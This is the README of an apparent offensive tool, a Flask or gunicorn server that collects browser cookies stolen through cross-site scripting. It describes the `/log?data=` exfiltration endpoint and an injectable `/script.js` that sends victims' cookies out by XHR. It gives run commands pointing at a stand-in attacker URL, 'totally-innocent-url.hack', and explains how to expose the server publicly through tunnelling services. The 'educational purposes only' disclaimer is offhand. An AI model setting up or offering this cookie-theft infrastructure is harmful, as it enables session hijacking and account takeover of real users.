# Cookie logger🍪

HTTP server to log users' cookies when exploiting XSS.

To log cookies, simply send GET request to `/log?data={cookies}&url={url}`, {url} is the site where cookies was logged. Cookies will be logged to stdout and stored in `cookies.log` file. 

Script for automatic logging is served at `/script.js`. Note that this script is making an XHR, hence to log cookies on HTTPS site this server should be also HTTPS-hosted. Also, HttpOnly cookies obviously will not be logged because javascript can't access them.

## Running

Set SERVER_URL to public (preferably https) url of a server you're running this script on. If you don't have one, see the next section. This is needed to serve a proper `/script.js` 

```console
$ export SERVER_URL=https://totally-innocent-url.hack
$ flask --app 'main:create_app("'$SERVER_URL'")' run --host 0.0.0.0 --port 4444
```

or with gunicorn (better for production):

```console
$ export SERVER_URL=https://totally-innocent-url.hack
$ gunicorn 'main:create_app("'$SERVER_URL'")' -b 0.0.0.0:4444
```

## Getting public url for free

You can use [Tunnelmole](https://tunnelmole.com/), [Telebit](https://telebit.cloud/), [ngrok](https://ngrok.com/) or any other alternative of your choice. It's simple as:

```console
$ tmole 4444
http://s3rd.tunnelmole.net
https://s3rd.tunnelmole.net
```

Then set `SERVER_URL` in the previous section to the received https url and run the server.

## Disclaimer

For educational purposes only and all that jazz.

And I didn't use this for anything nasty, I promise :)